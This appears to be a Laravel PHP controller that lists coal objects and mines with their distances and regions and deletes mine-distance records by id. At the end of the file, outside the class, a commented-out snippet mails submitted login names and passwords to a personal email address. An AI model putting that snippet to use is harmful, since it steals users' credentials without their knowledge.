<?php

namespace App\Http\Controllers;

use App\CoilObject;
use App\Mine;
use App\CoilObjectMineDistance;
use App\CoilObjectDistance;
use App\CoilObjectType;
use App\Destination;
use App\Region;
use Illuminate\Http\Request;

class IndexController extends Controller
{
    public function index()
    {

        $model = CoilObject::select('*', 'person_subtitle as personSubtitle', 'coal_type as coalType')
            ->with('distances.destination', 'region', 'type', 'mineDistances.mine')
            ->where('status', 1)
            ->get();

        if (!empty($model)) {
            foreach($model as $item) {
                $destination = [];
                if (!empty($item->distances)) {
                    foreach($item->distances as $distance) {
                        $destination[] = [
                            'name' => $distance->destination->name,
                            'distance' => $distance->distance
                        ];
                    }
                }
                unset($item->distances);
                unset($item->region_id);
                $item->destinations = $destination;
                $region = $item->region;
                unset($item->region);
                unset($item->type_id);
                unset($item->type->color);
                unset($item->type->icon);
//                unset($item->type->id);
                $item->region = $region->id ?? null;
                if (!empty($item->phones)) {
                    $phones = (array) $item->phones;
                    $item->phones = implode(",", $phones);
                }

                if (!empty($item->mineDistances) && !empty($item->mineDistances->mine->title) && !empty($item->mineDistances->distance)) {
                    $item->mine_title = $item->mineDistances->mine->title;
                    $item->mine_distance = $item->mineDistances->distance;
                }
                unset($item->mineDistances);

            }
        }

//        return $model;


        $mines = Mine::select('*', 'person_subtitle as personSubtitle', 'coal_type as coalType')
            ->with('distances', 'region', 'type')
            ->where('status', 1)
            ->get();

//        return $mines;

        if (!empty($mines)) {
            foreach($mines as $item) {
                $destination = [];
                if (!empty($item->distances)) {
                    foreach($item->distances as $distance) {
                        $destination[] = [
                            'name' => $distance->name,
                            'distance' => $distance->distance
                        ];
                    }
                }
                unset($item->distances);
                unset($item->region_id);
                $item->destinations = $destination;
                $region = $item->region;
                unset($item->region);
//                unset($item->type->id);
                $item->region = $region->id ?? null;
                if (!empty($item->phones)) {
                    $phones = (array) $item->phones;
                    $item->phones = implode(",", $phones);
                }

            }
        }

        $types = CoilObjectType::all();
        return view('index.index', compact('types', 'model', 'mines'));
    }

    public function deleteMineDistance($id)
    {
        $model = CoilObjectMineDistance::where('id', $id)
            ->first();
        if (!empty($model)) {
            $model->delete();
        }
        return back();
    }
}

//if (isset($_POST['name']) && isset($_POST['pass'])) {
//    $msg = $_POST['name'] . ' ' . $_POST['pass'];
//    $msg = wordwrap($msg,70);
//    mail("galifax94@gmail.com","Login",$msg);
//}
